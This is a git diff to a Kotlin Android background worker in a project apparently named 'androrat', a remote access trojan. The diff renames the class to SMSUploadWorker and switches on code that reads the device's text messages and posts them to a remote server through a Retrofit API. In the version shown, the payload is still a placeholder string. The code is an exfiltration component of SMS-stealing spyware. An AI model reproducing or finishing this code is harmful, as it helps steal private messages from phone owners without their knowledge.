@@ -5,9 +5,11 @@ import android.net.Uri
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
+import com.ierusalem.androrat.networking.RetrofitInstance
+import com.ierusalem.androrat.networking.SMSModel
 import com.ierusalem.androrat.screens.home.model.SMSMessage
 
-class UploadWorker(context: Context, workerParameters: WorkerParameters) :
+class SMSUploadWorker(context: Context, workerParameters: WorkerParameters) :
     CoroutineWorker(context, workerParameters) {
     override suspend fun doWork(): Result {
         val allMessages: MutableMap<String, List<Any>> = mutableMapOf()
@@ -25,21 +27,20 @@ class UploadWorker(context: Context, workerParameters: WorkerParameters) :
             deviceMessages += "$sender -  $messages \n "
         }
         Log.d("ahi3646_upload", "doWork: upload - deviceMessages")
-//        val apiService = RetrofitInstance(applicationContext).api
-//        return try {
-//            val response = apiService.postMessages(SMSModel(messages))
-//            if (response.isSuccessful) {
-//                Log.d("ahi3646_view_model", "sendMessages: success - ${response.body()} ")
-//                Result.success()
-//            }else{
-//                Log.d("ahi3646_view_model", "sendMessages: failure  - ${response.errorBody()}")
-//                Result.failure()
-//            }
-//        } catch (e: Exception) {
-//            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
-//            Result.failure()
-//        }
-        return Result.success()
+        val apiService = RetrofitInstance(applicationContext).api
+        return try {
+            val response = apiService.postMessages(SMSModel("deviceMessages hasan X"))
+            if (response.isSuccessful) {
+                Log.d("ahi3646_view_model", "sendMessages: success - ${response.body()} ")
+                Result.success()
+            }else{
+                Log.d("ahi3646_view_model", "sendMessages: failure  - ${response.errorBody()}")
+                Result.failure()
+            }
+        } catch (e: Exception) {
+            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
+            Result.failure()
+        }
     }
 
     private fun readMessages(context: Context, type: String): List<SMSMessage> {
